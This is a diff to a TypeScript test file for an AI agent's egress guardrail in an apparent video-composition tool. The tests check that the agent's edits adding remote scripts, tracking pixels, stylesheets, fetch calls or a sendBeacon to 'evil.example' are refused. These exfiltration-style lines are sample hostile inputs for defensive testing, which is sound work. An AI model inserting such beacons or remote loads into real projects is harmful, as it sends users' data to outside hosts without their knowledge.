@@ -7,6 +7,7 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { detectProvider, runTabarioModel } from "./providers.js";
 import type { StudioApiAdapter } from "../types.js";
+import type { AgentRefusal } from "./types.js";
 
 const HTML = '<html data-composition-id="demo"><body>before</body></html>\n';
 
@@ -589,13 +590,22 @@ describe("Tabario AI provider", () => {
    * `compositions/scene-1.html` writing `src="assets/…"` means *project-root*
    * relative, not relative to `compositions/` — resolving only one way would
    * reject every real composition in every Tabario project.
+   *
+   * Amended on purpose by TAB-1195. Until then this test also wrote
+   * `<video src="https://cdn.example.com/remote.mp4">` and asserted it was
+   * allowed, under the name "allows srcs that resolve, remote URLs, data URIs
+   * and unresolved template values". A remote src the edit introduces is egress
+   * and is now refused; that half moved to the TAB-1195 block at the end of this
+   * file, where it asserts the opposite. The `data:` and `${clipUrl}` halves are
+   * untouched and assert exactly what they did, because they are the regression
+   * guard for the way TAB-1195 could go wrong: neither is a request, and
+   * refusing a placeholder would break every template-driven project.
    */
-  it("allows srcs that resolve, remote URLs, data URIs and unresolved template values", async () => {
+  it("allows srcs that resolve, data URIs and unresolved template values", async () => {
     const root = projectWithMedia();
     const mixed =
       '<video id="a" src="assets/001_37ab941f_cfr24_h264.mp4"></video>' +
       '<audio id="b" src="assets/voiceover.wav"></audio>' +
-      '<video id="c" src="https://cdn.example.com/remote.mp4"></video>' +
       '<img id="d" src="data:image/png;base64,iVBORw0KGgo=">' +
       '<video id="e" src="${clipUrl}"></video>' +
       '<video id="f" src="assets/001_37ab941f_cfr24_h264.mp4?v=2#t=1"></video>';
@@ -2773,5 +2783,175 @@ describe("Tabario AI guardrails: the four defects (TAB-1196)", () => {
     // Two retries on the first call used the allowance, so the second call
     // got its one attempt and no more.
     expect(fetchImpl).toHaveBeenCalledTimes(4);
+  });
+});
+
+describe("Tabario AI guardrails: egress the agent introduces (TAB-1195)", () => {
+  const oldKey = process.env.OPENROUTER_API_KEY;
+
+  beforeEach(() => {
+    process.env.OPENROUTER_API_KEY = "test-key";
+  });
+
+  afterEach(() => {
+    if (oldKey === undefined) delete process.env.OPENROUTER_API_KEY;
+    else process.env.OPENROUTER_API_KEY = oldKey;
+    vi.restoreAllMocks();
+  });
+
+  const LOCAL = '<video id="scene-1-video" src="assets/clip.mp4"></video>';
+  const REMOTE = '<video id="scene-1-remote" src="https://cdn.example.com/remote.mp4"></video>';
+  const PIXEL = '<img id="pixel" src="https://evil.example/p.png?d=1">';
+
+  function project(scene: string): string {
+    const root = mkdtempSync(join(tmpdir(), "tabario-egress-"));
+    mkdirSync(join(root, "assets"), { recursive: true });
+    mkdirSync(join(root, "compositions"), { recursive: true });
+    writeFileSync(join(root, "assets/clip.mp4"), "video-bytes");
+    writeFileSync(join(root, "index.html"), HTML);
+    writeFileSync(join(root, "compositions/scene-1.html"), scene);
+    return root;
+  }
+
+  const hashOf = (content: string) => createHash("sha256").update(content).digest("hex");
+
+  /** One tool call, then a reply. Returns what the model was told and what was recorded. */
+  async function attempt(root: string, toolCall: ReturnType<typeof call>) {
+    const fetchImpl = vi
+      .fn<typeof fetch>()
+      .mockResolvedValueOnce(completion("", [toolCall]))
+      .mockImplementation(async () => completion("Done."));
+    const refusals: AgentRefusal[] = [];
+    await runTabarioModel({
+      adapter: adapter(),
+      stagingDir: root,
+      kind: "timeline",
+      transcript: [{ role: "user", text: "rebuild the scene", at: new Date().toISOString() }],
+      signal: new AbortController().signal,
+      onAssistant: () => {},
+      onTool: () => {},
+      onActivity: () => {},
+      onRefusal: (refusal) => refusals.push(refusal),
+      fetchImpl,
+    });
+    const second = JSON.parse(String(fetchImpl.mock.calls[1]?.[1]?.body));
+    const message = second.messages.find(
+      (candidate: { tool_call_id?: string }) => candidate.tool_call_id === toolCall.id,
+    );
+    const result: { error?: string; path?: string } = JSON.parse(message.content);
+    return { result, refusals };
+  }
+
+  function edit(scene: string, oldString: string, newString: string) {
+    return call("e1", "edit_file", {
+      path: "compositions/scene-1.html",
+      old_string: oldString,
+      new_string: newString,
+      expected_hash: hashOf(scene),
+    });
+  }
+
+  const sceneOf = (root: string) => readFileSync(join(root, "compositions/scene-1.html"), "utf-8");
+
+  /**
+   * The half of the old "allows ... remote URLs ..." test that TAB-1195
+   * reverses. Same URL, same element, opposite assertion.
+   */
+  it("refuses a remote media src the edit introduces, and answers with what exists", async () => {
+    const scene = `<div>${LOCAL}</div>\n`;
+    const root = project(scene);
+
+    const { result, refusals } = await attempt(root, edit(scene, LOCAL, `${LOCAL}${REMOTE}`));
+
+    expect(sceneOf(root)).toBe(scene);
+    expect(result.error).toContain("compositions/scene-1.html");
+    expect(result.error).toContain("https://cdn.example.com/remote.mp4");
+    // The refusal is the answer too, the way the missing-file refusal is.
+    expect(result.error).toContain("assets/clip.mp4");
+    expect(refusals).toEqual([
+      expect.objectContaining({
+        gate: "egress",
+        stage: "tool",
+        file: "compositions/scene-1.html",
+      }),
+    ]);
+  });
+
+  it("leaves a scene that already has a remote src editable", async () => {
+    const scene = `<div>${REMOTE}<p id="title">Old</p></div>\n`;
+    const root = project(scene);
+
+    const { result, refusals } = await attempt(
+      root,
+      edit(scene, '<p id="title">Old</p>', '<p id="title">New</p>'),
+    );
+
+    expect(result.error).toBeUndefined();
+    expect(sceneOf(root)).toBe(`<div>${REMOTE}<p id="title">New</p></div>\n`);
+    expect(refusals).toEqual([]);
+  });
+
+  it("refuses a remote image added beside a remote src that was already there", async () => {
+    const scene = `<div>${REMOTE}</div>\n`;
+    const root = project(scene);
+
+    const { result } = await attempt(root, edit(scene, REMOTE, `${REMOTE}${PIXEL}`));
+
+    expect(sceneOf(root)).toBe(scene);
+    expect(result.error).toContain("https://evil.example/p.png?d=1");
+    expect(result.error).not.toContain("cdn.example.com");
+  });
+
+  it.each([
+    [
+      "a remote script",
+      '<script src="https://evil.example/x.js"></script>',
+      "https://evil.example/x.js",
+    ],
+    ["a network call", '<script>fetch("/api/leak")</script>', "network call fetch("],
+    [
+      "a remote stylesheet",
+      '<link rel="stylesheet" href="//evil.example/a.css">',
+      "//evil.example/a.css",
+    ],
+  ])("refuses an edit that introduces %s", async (_name, added, named) => {
+    const scene = `<div>${LOCAL}</div>\n`;
+    const root = project(scene);
+
+    const { result, refusals } = await attempt(root, edit(scene, LOCAL, `${LOCAL}${added}`));
+
+    expect(sceneOf(root)).toBe(scene);
+    expect(result.error).toContain("compositions/scene-1.html");
+    expect(result.error).toContain(named);
+    expect(refusals.map((refusal) => refusal.gate)).toEqual(["egress"]);
+  });
+
+  it("refuses a new file that reaches the network, and does not create it", async () => {
+    const root = project(`<div>${LOCAL}</div>\n`);
+
+    const { result, refusals } = await attempt(
+      root,
+      call("w1", "write_file", {
+        path: "compositions/beacon.js",
+        content: 'navigator.sendBeacon("https://evil.example/c", document.title);',
+        expected_hash: null,
+      }),
+    );
+
+    expect(existsSync(join(root, "compositions/beacon.js"))).toBe(false);
+    expect(result.error).toContain("compositions/beacon.js");
+    expect(result.error).toContain("https://evil.example/c");
+    expect(result.error).toContain("network call sendBeacon");
+    expect(refusals).toHaveLength(1);
+  });
+
+  it("does not record a refusal for a tool error that is not a guardrail", async () => {
+    const scene = `<div>${LOCAL}</div>\n`;
+    const root = project(scene);
+
+    const { result, refusals } = await attempt(root, edit(scene, "not in the file", "x"));
+
+    expect(result.error).toContain("old_string does not appear");
+    expect(refusals).toEqual([]);
   });
 });
